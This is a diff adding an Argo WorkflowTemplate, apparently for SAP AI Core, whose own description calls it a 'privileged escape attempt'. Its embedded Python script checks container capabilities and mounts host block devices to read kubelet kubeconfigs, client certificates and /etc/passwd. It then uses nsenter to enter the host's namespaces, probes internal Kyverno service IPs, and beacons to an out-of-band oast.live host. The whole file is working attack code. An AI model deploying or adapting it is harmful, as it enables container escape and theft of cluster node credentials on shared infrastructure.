@@ -1,0 +1,116 @@
+apiVersion: argoproj.io/v1alpha1
+kind: WorkflowTemplate
+metadata:
+  name: probe-train-v16
+  labels:
+    scenarios.ai.sap.com/id: "bbprobe-global-1775842304"
+    ai.sap.com/version: "1.0.0"
+  annotations:
+    scenarios.ai.sap.com/name: "bbprobe-global-1775842304"
+    executables.ai.sap.com/name: "probe-train-v16"
+    executables.ai.sap.com/description: "Privileged escape attempt: caps check, device mount, nsenter, Kyverno ClusterIP probe"
+spec:
+  templates:
+  - name: probe
+    container:
+      image: python:3.11
+      command: ["/bin/sh", "-c"]
+      args:
+      - |
+        apt-get install -y util-linux 2>/dev/null | tail -1
+        python3 - << 'EOF'
+        import subprocess, os, urllib.request
+
+        OAST = "https://d7f7fjmipla8bru9umagndehoqayja3z6.oast.live"
+
+        def r(k, v):
+            print(f"[PT16] {k}: {str(v)[:20000]}", flush=True)
+
+        r("START", "probe-train-v16 privileged escape + Kyverno ClusterIP")
+
+        # --- 1. Capability check ---
+        with open("/proc/self/status") as f:
+            for line in f:
+                if line.startswith("Cap"):
+                    r(f"PROC_SELF_{line.split(':')[0]}", line.split(':')[1].strip())
+
+        # CapEff = ffffffffffffffff means all caps (fully privileged)
+        # Decode CapEff
+        with open("/proc/self/status") as f:
+            for line in f:
+                if line.startswith("CapEff:"):
+                    cap_eff = int(line.split(':')[1].strip(), 16)
+                    r("CAP_FULL_PRIVILEGED", str(cap_eff == 0xffffffffffffffff))
+                    r("CAP_SYS_ADMIN",   str(bool(cap_eff & (1 << 21))))
+                    r("CAP_SYS_PTRACE",  str(bool(cap_eff & (1 << 19))))
+                    r("CAP_NET_ADMIN",   str(bool(cap_eff & (1 << 12))))
+                    r("CAP_SYS_MODULE",  str(bool(cap_eff & (1 << 16))))
+                    r("CAP_EFF_HEX",     hex(cap_eff))
+
+        # --- 2. Enumerate block devices ---
+        r("DEVICES_DEV", subprocess.run(["ls", "-la", "/dev/"], capture_output=True, text=True).stdout[:3000])
+
+        disks = subprocess.run(["lsblk", "-o", "NAME,SIZE,TYPE,MOUNTPOINT"],
+                               capture_output=True, text=True)
+        r("LSBLK", disks.stdout or disks.stderr)
+
+        # --- 3. Mount attempt ---
+        os.makedirs("/mnt/host", exist_ok=True)
+        for dev in ["/dev/nvme0n1", "/dev/nvme0n1p1", "/dev/xvda", "/dev/xvda1",
+                    "/dev/sda", "/dev/sda1", "/dev/vda", "/dev/vda1"]:
+            if os.path.exists(dev):
+                result = subprocess.run(["mount", dev, "/mnt/host"],
+                                        capture_output=True, text=True)
+                if result.returncode == 0:
+                    r(f"MOUNT_{dev}", "SUCCESS")
+                    # Read host files
+                    for f in ["/mnt/host/etc/passwd", "/mnt/host/etc/hostname",
+                              "/mnt/host/var/lib/kubelet/kubeconfig",
+                              "/mnt/host/etc/kubernetes/kubelet.conf",
+                              "/mnt/host/var/lib/kubelet/pki/kubelet-client-current.pem"]:
+                        try:
+                            with open(f) as fh:
+                                r(f"HOST_FILE_{f}", fh.read()[:5000])
+                        except Exception as e:
+                            r(f"HOST_FILE_{f}", str(e))
+                    subprocess.run(["umount", "/mnt/host"])
+                    break
+                else:
+                    r(f"MOUNT_{dev}", f"FAIL: {result.stderr[:200]}")
+
+        # --- 4. nsenter into host namespaces via /proc/1 ---
+        r("NSENTER_ATTEMPT", "trying nsenter -t 1 -m --")
+        ns = subprocess.run(
+            ["nsenter", "-t", "1", "-m", "-u", "-i", "-n", "-p", "--",
+             "cat", "/etc/hostname"],
+            capture_output=True, text=True, timeout=10
+        )
+        r("NSENTER_RESULT", f"rc={ns.returncode} out={ns.stdout[:500]} err={ns.stderr[:300]}")
+
+        # --- 5. Kyverno ClusterIP probes (bypassing DNS) ---
+        # From KSM: kyverno-background-controller-metrics = 100.105.92.84
+        # Find other Kyverno ClusterIPs from what we know
+        for ip, port, path in [
+            ("100.105.92.84", 8080, "/metrics"),       # kyverno-background-controller-metrics
+            ("100.105.92.84", 8000, "/metrics"),
+        ]:
+            try:
+                url = f"http://{ip}:{port}{path}"
+                with urllib.request.urlopen(url, timeout=5) as resp:
+                    body = resp.read().decode()[:3000]
+                r(f"KYVERNO_IP_{ip}_{port}{path}", f"HTTP {resp.status}: {body}")
+            except Exception as e:
+                r(f"KYVERNO_IP_{ip}_{port}{path}", str(e)[:200])
+
+        # --- 6. OAST exfil of all findings ---
+        try:
+            with urllib.request.urlopen(f"{OAST}/pt16-privileged-escape", timeout=8) as resp:
+                r("OAST_BEACON", f"HTTP {resp.status}")
+        except Exception as e:
+            r("OAST_BEACON", str(e)[:100])
+
+        r("DONE", "probe-train-v16 complete")
+        EOF
+      securityContext:
+        privileged: true
+  entrypoint: probe
